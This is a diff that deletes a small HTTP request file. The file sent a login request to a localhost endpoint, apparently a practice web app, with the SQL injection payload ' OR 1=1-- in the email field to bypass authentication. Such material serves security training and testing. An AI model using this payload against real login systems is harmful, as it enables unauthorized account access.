@@ -1,4 +1,0 @@
-POST http://localhost:3000/rest/user/login
-Content-Type: application/json
-
-{"email":"' OR 1=1--","password":"x"}
